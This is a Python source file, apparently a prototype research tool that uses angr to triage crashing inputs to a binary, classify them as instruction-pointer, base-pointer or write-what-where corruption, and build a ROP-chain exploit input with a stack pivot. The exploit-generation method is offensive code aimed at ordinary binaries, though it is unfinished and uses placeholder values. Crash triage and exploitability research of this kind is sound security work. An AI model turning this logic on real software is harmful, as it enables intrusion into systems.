import logging

l = logging.getLogger("triage.Triage")

import angr
import tracer
from IPython import embed

class TriageNonCrashingInput(Exception):
    pass

class Crash(object):
    '''
    Triage a crash using angr.
    '''

    EIP_OVERWRITE    = "eip_overwrite"
    EBP_OVERWRITE    = "ebp_overwrite"
    WRITE_WHAT_WHERE = "write_what_where"
    WRITE_X_WHERE    = "write_x_where"

    def __init__(self, binary, crash):
        '''
        :param binary: path to the binary which crashed
        :param crash: string of input which crashed the binary
        '''

        self.binary = binary
        self.crash  = crash

        self.tracer = tracer.Tracer(binary, crash)

        if not self.tracer.crash_mode:
            l.error("input provided did not cause a crash in %s", binary)
            raise TriageNonCrashingInput

        # run the tracer, grabbing the crash state
        t_result = self.tracer.run()
        if not isinstance(t_result, tuple):
            l.warning("TODO unable to analyze crash because angr deadended")
            raise TriageNonCrashingInput

        prev, state = t_result

        # a path leading up to the crashing basic block
        self.prev   = prev

        # the state at crash time
        self.state  = state

        # crash type
        self.crash_type = None

        self.symbolic_mem = { } 

        for act in prev.actions:
            if act.type == "mem" and act.action == "write":
                what = act.data.ast
                if not (isinstance(what, int) or isinstance(what, long)):
                    if self.state.se.symbolic(what): 
                        what_l = len(what) / 8
                        if self.state.se.symbolic(act.addr.ast):
                            l.warning("symbolic write target address is symbolic")
                        target = self.state.se.any_int(act.addr.ast)
                        if target not in self.symbolic_mem or (self.symbolic_mem[target] + what_l) > self.symbolic_mem[target]:
                            self.symbolic_mem[target] = what_l 

### EXPOSED
    def exploitable(self):
        '''
        determine if the crash is exploitable
        '''

        eip = self.state.regs.eip
        ebp = self.state.regs.ebp

        # we assume a symbolic eip is always exploitable
        if self.state.se.symbolic(eip):
            l.info("detected eip overwrite vulnerability")
            self.crash_type = Crash.EIP_OVERWRITE

            return True

        # XXX
        # not sure how easily exploitable this will be unless they start
        # using the leave instruction
        if self.state.se.symbolic(ebp):
            l.info("detected ebp overwrite vulnerability")
            self.crash_type = Crash.EBP_OVERWRITE

            return True

        # if nothing painfully obvious is symbolic let's look at actions

        # grab the all actions in the last basic block
        symbolic_actions = [ ] 
        for a in self.state.log.actions:
            if a.type == 'mem':
                if self.state.se.symbolic(a.addr):
                    symbolic_actions.append(a)

        for sym_action in symbolic_actions:
            if sym_action.action == "write":
                if self.state.se.symbolic(sym_action.data):  
                    l.info("detected write-what-where vulnerability")
                    self.crash_type = Crash.WRITE_WHAT_WHERE
                else:
                    l.info("detected write-x-where vulnerability")
                    self.crash_type = Crash.WRITE_X_WHERE

                return True

        return False


    def exploit(self):
        '''
        generate an exploit based off the crash
        '''

        assert (self.crash_type is not None, "must call exploitable before trying to exploit")

        if (self.crash_type == Crash.EIP_OVERWRITE):
            #return self._eip_overwrite(

            sp = self.state.se.any_int(self.state.regs.sp)

            # first let's see what kind of stack control we have
            symbolic_stack = self._stack_control()
            if len(symbolic_stack) == 0:
                l.error("no controlled data beneath stack, need to resort to shellcode")
                return None

            rop = angr.Project(self.binary).analyses.ROP()
            rop.find_gadgets()

            # at the moment we just do ECX for prototyping
            try:
                chain = rop.write_to_mem(0x6969, "mike")
            except angr.analyses.rop.RopException:
                l.error("unable to set requested register with ROP")
                return None

            chain_addr = None
            stack_pivot = None
            # loop until we can find a chain which gets us to our setter gadget
            for addr in symbolic_stack:
                pivot_gap = addr - sp
                chain_req = chain.payload_len

                # is the space too small?
                if not symbolic_stack[addr] >= chain_req:
                    continue

                # okay we have a symbolic region which fits and is below sp
                # can we pivot there?
                for gadget in rop.gadgets:
                    # let's make sure the gadget is sane

                    # TODO: consult state before throwing out a gadget, some of these memory 
                    # accesses might be acceptable
                    if len(gadget.mem_changes + gadget.mem_writes + gadget.mem_reads) > 0:
                        continue

                    # if we assume all gadgets end in a 'ret' we can subtract 4 from the stack_change
                    # as we're not interested in the ret's effect on stack movement, because when the
                    # ret executes we'll have chain control

                    jumps_to = sp + (gadget.stack_change - 4)
                    # does it hit the controlled region?
                    if jumps_to > addr and jumps_to < addr + symbolic_stack[addr]:
                        if symbolic_stack[addr] - (jumps_to - addr) >= chain_req:
                            # we're in!
                            chain_addr = jumps_to
                            stack_pivot = gadget
                            break

                if chain_addr is not None and stack_pivot is not None:
                    break

            # constrain jumps_to to equal the rop setter
            # constrain eip to equal the stack_pivot
            if chain_addr is None and stack_pivot is None:
                l.error("unable to generate payload with the requested rop") 
                return None

            chain_set = self.state.memory.load(chain_addr, chain.payload_len) == self.state.BVV(chain.payload_str())
            eip_set = self.state.regs.eip == stack_pivot.addr
            
            exploit = self.state.copy()

            exploit.add_constraints(chain_set)
            exploit.add_constraints(eip_set)

            l.info("exploit generated")
            return exploit.posix.dumps(0)

### UTIL

    def _stack_control(self):
        '''
        determine what symbolic memory we control equal to or beneath sp
        '''

        control = { } 

        if self.state.se.symbolic(self.state.regs.sp):
            l.warning("detected symbolic sp when guaging stack control")
            return control

        sp = self.state.se.any_int(self.state.regs.sp)
        for addr in self.symbolic_mem:
            # if the region is above sp it gets added
            if addr > sp:
                control[addr] = self.symbolic_mem[addr]

            # if sp falls into the region it gets added starting at sp
            if sp <= addr + self.symbolic_mem[addr]:
                control[sp] = addr + self.symbolic_mem[addr] - sp

        return control
